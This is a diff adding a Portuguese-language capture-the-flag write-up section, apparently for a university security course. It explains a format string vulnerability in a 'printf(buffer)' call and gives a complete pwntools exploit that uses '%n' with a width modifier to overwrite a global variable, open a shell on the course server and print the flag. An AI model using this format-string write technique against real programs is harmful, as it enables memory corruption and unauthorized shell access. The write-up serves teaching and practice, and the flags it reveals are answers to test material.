@@ -276,3 +276,54 @@ You gave me this: `\xcflag{c861bc5ded72328543e4a577b4fb89c6}
 Disqualified!
 [*] Got EOF while reading in interactive
 ```
+
+## Desafio 2
+
+Depois de analisar o código-fonte, verificou-se que a vulnerabilidade (`format string vulnerability`) encontra-se na **linha 14** - `printf(buffer)`, onde o conteúdo do `buffer` (32 bytes) é dado pelo utilizador na linha 12 - `scanf("%32s", &buffer)`. Ao contrário do desafio 1, a flag não está guardada em memória, no entanto, existe a possibilidade do programa dar ao utilizador o acesso à `bash`, consequentemente o acesso à flag. Para desbloquear esse acesso, é necessário alterar o valor da variável global `key` (por defeito 0) para um valor específico, neste caso 0xbeef (48879 em decimal), de modo a tornar a condição testada na linha 17 verdadeira. Para isso, utilizou-se a mesma técnica da `task 3.b` (e `task 3.a`) do lab, mas desta vez com um `width modifier` - "%48871x" - para controlar o número de dígitos impressos e consequentemente o valor final da variável global `key`. Assim foram impressos 48879 carateres - 4 (aleatórios) + 4 (para o endereço 0x0804c034) + 48871. O endereço de memória da variável global `key`, `0x0804c034`, foi descoberto utilizando o _gdb_ tal como é sugerido (à semelhança do desafio 1). O script fornecido foi alterado para o seguinte:
+
+- exploit_example.py
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4005)
+
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 32
+content = bytearray(0x0 for i in range(N))
+
+number  = 0x0804c034
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+number  = 0x0804c034
+content[4:8]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%48871x%n"
+
+fmt  = (s).encode('latin-1')
+content[8:8+len(fmt)] = fmt
+
+p.sendline(content)
+p.interactive()
+```
+É possível aceder à flag abrindo o ficheiro `flag.txt`:
+
+```bash
+[11/18/22]seed@VM:~/.../Semana7-Desafio2$ python3 exploit_example.py 
+[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
+[*] Switching to interactive mode
+There is nothing to see here...You gave me this:4\xc4\xc
+804c034Backdoor activated
+$ ls
+flag.txt
+run
+$ cat flag.txt
+flag{40beb6c9ff8cea392bfd3cf1094b3b8b}
+```
